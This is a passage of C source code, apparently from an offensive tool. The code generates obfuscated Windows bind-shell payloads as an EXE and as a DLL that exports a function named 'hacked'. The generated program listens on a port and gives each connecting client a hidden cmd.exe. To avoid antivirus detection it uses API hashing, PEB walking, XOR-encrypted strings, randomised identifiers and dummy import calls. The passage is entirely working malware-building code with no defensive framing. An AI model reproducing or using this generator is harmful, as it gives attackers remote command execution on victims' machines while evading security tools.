        "    return pAddress;\n"
        "}\n\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x84BD0AA5\n"
        "#define %s                  0xC9D1067D\n"
        "#define %s           0x0E32C08B\n"
        "#define %s             0xB703C453\n"
        "#define %s             0x5F3B12CA\n"
        "#define %s                  0x17387BA1\n"
        "#define %s            0xF77E6C94\n"
        "#define %s             0x9CA98668\n"
        "#define %s         0x579FB1E9\n"
        "#define %s                 0xEE56E0C4\n"
        "#define %s                 0xEEF1AC25\n"
        "#define %s                   0x91FAB552\n"
        "#define %s  0x2131236C\n"
        "#define %s                0x7E1EA2ED\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET, int);\n"
        "typedef SOCKET(WINAPI* %s)(SOCKET, struct sockaddr*, int*);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429\n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char pxey[] = \"%s\";\n"
        "char pcm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "void %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void %s() {\n"
        "    %s((char*)pcm, sizeof(pcm), pxey, sizeof(pxey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    struct sockaddr_in server_addr, client_addr;\n"
        "    int client_addr_len = sizeof(client_addr);\n"
        "    WSADATA wsa;\n"
        "    p%s(MAKEWORD(2, 2), &wsa);\n"
        "    SOCKET listen_socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (listen_socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    server_addr.sin_family = AF_INET;\n"
        "    server_addr.sin_port = p%s(%d);\n"
        "    server_addr.sin_addr.s_addr = INADDR_ANY;\n"
        "    if (p%s(listen_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {\n"
        "        p%s(listen_socket);\n"
        "        p%s();\n"
        "    }\n"
        "    if (p%s(listen_socket, SOMAXCONN) == SOCKET_ERROR) {\n"
        "        p%s(listen_socket);\n"
        "        p%s();\n"
        "    }\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        SOCKET client_socket = p%s(listen_socket, (SOCKADDR*)&client_addr, &client_addr_len);\n"
        "        if (client_socket == INVALID_SOCKET) {\n"
        "            p%s(listen_socket);\n"
        "            p%s();\n"
        "        }\n"
        "        ZeroMemory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_socket;\n"
        "        si.wShowWindow = SW_HIDE;\n"
        "        p%s(NULL, pcm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 5) {\n"
        "            p%s(pi.hProcess, FALSE, &timeout);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(client_socket);\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            p%s(pi.hProcess, FALSE, NULL);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(client_socket);\n"
        "        }\n"
        "    }\n"
        "    p%s(listen_socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE hKer = %s(%s);\n"
        "    HMODULE hnt = %s(%s);\n"
        "    %s p%s = (%s)%s(hKer, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), pxey, sizeof(pxey));\n"
        "    HMODULE h32 = p%s(ws2);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(hKer, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(hnt, %s);\n"
        "    p%s = (%s)%s(hnt, %s);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s();\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        htons_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        listen_hash_name,
        accept_hash_name,
        bind_hash_name,
        ntwait_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        htons_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        bind_typedef,
        listen_typedef,
        accept_typedef,
        NtWait_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        htons_typedef, phtons_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        bind_typedef, pbind_name,
        listen_typedef, plisten_name,
        accept_typedef, paccept_name,
        NtWait_typedef, pNtWait_name,
        NtClose_typedef, pNtClose_name,
        random_zero_func,
        random_bind_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pbind_name,
        pclosesocket_name,
        pWSACleanup_name,
        plisten_name,
        pclosesocket_name,
        pWSACleanup_name,
        paccept_name,
        pclosesocket_name,
        pWSACleanup_name,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pbind_name, bind_typedef, random_getproc_name, bind_hash_name,
        plisten_name, listen_typedef, random_getproc_name, listen_hash_name,
        paccept_name, accept_typedef, random_getproc_name, accept_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_init_func,
        random_bind_func
    );
}
void obf_3_bind_tcp_dll(char* payload, size_t size, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10];
    char random_bind_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_bind_func, sizeof(random_bind_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], phtons_name[9];
    char pclosesocket_name[9], pWSACleanup_name[9], pCreateProcessA_name[9];
    char pbind_name[9], plisten_name[9], paccept_name[9];
    char pNtWait_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pbind_name, sizeof(pbind_name));
    generate_random_string(plisten_name, sizeof(plisten_name));
    generate_random_string(paccept_name, sizeof(paccept_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], htons_hash_name[10];
    char closesocket_hash_name[11], wsacleanup_hash_name[13], createprocessa_hash_name[15];
    char bind_hash_name[10], listen_hash_name[10], accept_hash_name[10];
    char ntwait_hash_name[14], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(bind_hash_name, sizeof(bind_hash_name));
    generate_random_string(listen_hash_name, sizeof(listen_hash_name));
    generate_random_string(accept_hash_name, sizeof(accept_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], htons_typedef[12];
    char closesocket_typedef[12], WSACleanup_typedef[12], CreateProcessA_typedef[12];
    char bind_typedef[12], listen_typedef[12], accept_typedef[12];
    char NtWait_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(bind_typedef, sizeof(bind_typedef));
    generate_random_string(listen_typedef, sizeof(listen_typedef));
    generate_random_string(accept_typedef, sizeof(accept_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "extern void* __cdecl memset(void*, int, size_t);\n"
        "#pragma intrinsic(memset)\n"
        "#pragma function(memset)\n\n"
        "void* __cdecl memset(void* Destination, int Value, size_t Size) {\n"
        "    unsigned char* p = (unsigned char*)Destination;\n"
        "    while (Size > 0) {\n"
        "        *p = (unsigned char)Value;\n"
        "        p++;\n"
        "        Size--;\n"
        "    }\n"
        "    return Destination;\n"
        "}\n\n"
        "#define %s               0x84BD0AA5\n"
        "#define %s                  0xC9D1067D\n"
        "#define %s           0x0E32C08B\n"
        "#define %s             0xB703C453\n"
        "#define %s             0x5F3B12CA\n"
        "#define %s                  0x17387BA1\n"
        "#define %s            0xF77E6C94\n"
        "#define %s             0x9CA98668\n"
        "#define %s         0x579FB1E9\n"
        "#define %s                 0xEE56E0C4\n"
        "#define %s                 0xEEF1AC25\n"
        "#define %s                   0x91FAB552\n"
        "#define %s  0x2131236C\n"
        "#define %s                0x7E1EA2ED\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET, int);\n"
        "typedef SOCKET(WINAPI* %s)(SOCKET, struct sockaddr*, int*);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429\n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char pxey[] = \"%s\";\n"
        "char pcm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "void %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void %s() {\n"
        "    %s((char*)pcm, sizeof(pcm), pxey, sizeof(pxey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    struct sockaddr_in server_addr, client_addr;\n"
        "    int client_addr_len = sizeof(client_addr);\n"
        "    WSADATA wsa;\n"
        "    p%s(MAKEWORD(2, 2), &wsa);\n"
        "    SOCKET listen_socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (listen_socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    server_addr.sin_family = AF_INET;\n"
        "    server_addr.sin_port = p%s(%d);\n"
        "    server_addr.sin_addr.s_addr = INADDR_ANY;\n"
        "    if (p%s(listen_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {\n"
        "        p%s(listen_socket);\n"
        "        p%s();\n"
        "    }\n"
        "    if (p%s(listen_socket, SOMAXCONN) == SOCKET_ERROR) {\n"
        "        p%s(listen_socket);\n"
        "        p%s();\n"
        "    }\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        SOCKET client_socket = p%s(listen_socket, (SOCKADDR*)&client_addr, &client_addr_len);\n"
        "        if (client_socket == INVALID_SOCKET) {\n"
        "            p%s(listen_socket);\n"
        "            p%s();\n"
        "        }\n"
        "        ZeroMemory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_socket;\n"
        "        si.wShowWindow = SW_HIDE;\n"
        "        p%s(NULL, pcm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 5) {\n"
        "            p%s(pi.hProcess, FALSE, &timeout);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(client_socket);\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            p%s(pi.hProcess, FALSE, NULL);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(client_socket);\n"
        "        }\n"
        "    }\n"
        "    p%s(listen_socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE phke = %s(%s);\n"
        "    HMODULE pnt = %s(%s);\n"
        "    %s p%s = (%s)%s(phke, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), pxey, sizeof(pxey));\n"
        "    HMODULE phW = p%s(ws2);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phke, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(phW, %s);\n"
        "    p%s = (%s)%s(pnt, %s);\n"
        "    p%s = (%s)%s(pnt, %s);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    %s();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        random_toUpper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        htons_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        listen_hash_name,
        accept_hash_name,
        bind_hash_name,
        ntwait_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        htons_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        bind_typedef,
        listen_typedef,
        accept_typedef,
        NtWait_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        htons_typedef, phtons_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        bind_typedef, pbind_name,
        listen_typedef, plisten_name,
